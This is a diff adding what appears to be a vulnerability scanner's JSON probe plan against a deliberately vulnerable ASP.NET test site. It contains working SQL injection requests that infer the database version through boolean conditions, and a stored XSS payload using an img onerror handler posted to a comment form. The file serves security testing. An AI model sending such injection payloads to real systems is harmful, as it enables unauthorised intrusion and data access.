@@ -1,0 +1,149 @@
+{
+ "layer": "sentinel-impact/4.4.0",
+ "target": "http://testaspnet.vulnweb.com",
+ "run_id": "run-4fe17c44cc",
+ "redirect_sink": "http://127.0.0.1:39709/l3redir-ab12",
+ "origin_probe": "https://csrf-probe.example",
+ "cart_view": "/cart",
+ "redirect_param": null,
+ "path_plans": [
+  {
+   "path_id": "L3P-dd590073f0",
+   "probe_kind": "sql_version_oracle",
+   "findings": [
+    "F-1e2f9fefe2"
+   ],
+   "title": "sql_version_oracle at /ReadNews.aspx (param id) — minimal benign proof",
+   "status": "PLANNED",
+   "refusal_reason": "",
+   "requests": [
+    {
+     "label": "control_true",
+     "method": "GET",
+     "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+1%3D1",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj"
+     },
+     "body": "",
+     "condition": "1=1",
+     "rid": "pr-0001"
+    },
+    {
+     "label": "control_false",
+     "method": "GET",
+     "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+1%3D2",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj"
+     },
+     "body": "",
+     "condition": "1=2",
+     "rid": "pr-0002"
+    },
+    {
+     "label": "version_true",
+     "method": "GET",
+     "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+%40%40version+LIKE+%27%25%27",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj"
+     },
+     "body": "",
+     "condition": "@@version LIKE '%'",
+     "rid": "pr-0003"
+    },
+    {
+     "label": "version_false",
+     "method": "GET",
+     "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+%40%40version+LIKE+%27zzz-sentinel-nope%25%27",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj"
+     },
+     "body": "",
+     "condition": "@@version LIKE 'zzz-sentinel-nope%'",
+     "rid": "pr-0004"
+    },
+    {
+     "label": "version_digit_8",
+     "method": "GET",
+     "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+SUBSTRING%28%40%40version%2C1%2C1%29%3D%278%27",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj"
+     },
+     "body": "",
+     "condition": "SUBSTRING(@@version,1,1)='8'",
+     "rid": "pr-0005"
+    },
+    {
+     "label": "version_digit_5",
+     "method": "GET",
+     "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj"
+     },
+     "body": "",
+     "condition": "SUBSTRING(@@version,1,1)='5'",
+     "rid": "pr-0006"
+    }
+   ],
+   "plan_detail": {
+    "template": {
+     "keyword": "AND",
+     "kind": "query",
+     "param": "id",
+     "orig_cond": "1=1"
+    }
+   }
+  },
+  {
+   "path_id": "L3P-ed0bc692be",
+   "probe_kind": "xss_stored_persistence",
+   "findings": [
+    "F-9779edbacd"
+   ],
+   "title": "xss_stored_persistence at /Comments.aspx (param tbComment) — minimal benign proof",
+   "status": "PLANNED",
+   "refusal_reason": "",
+   "requests": [
+    {
+     "label": "stored_resubmit",
+     "method": "POST",
+     "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=2",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Referer": "http://testaspnet.vulnweb.com/Comments.aspx?id=2",
+      "Cookie": "ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj"
+     },
+     "body": "tbComment=%3Cimg+src%3Dx+onerror%3D%27window.__SENTINEL_XSS__%3D%22l3stocanary%22%27%3E&btnSend=Send+comment",
+     "expected_status": 200,
+     "rid": "pr-0007"
+    },
+    {
+     "label": "browser_exec_stored",
+     "method": "GET",
+     "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=2",
+     "headers": {},
+     "body": "",
+     "expected_flag": "l3stocanary",
+     "expected_variant": "raw_markup",
+     "render_url": "http://testaspnet.vulnweb.com/Comments.aspx?id=2",
+     "rid": "pr-0008"
+    }
+   ],
+   "plan_detail": {}
+  }
+ ],
+ "summary": {
+  "total": 2,
+  "planned": 2,
+  "refused": 0,
+  "not_safe": 0,
+  "requests": 8,
+  "honesty": "every planned request is a minimal benign probe from the fail-closed safety registries; REFUSED and NOT_SAFE_TO_PROVE name their reasons. Capability proven, not exploited — أُثبتت القدرة، لم تُستغَل"
+ }
+}
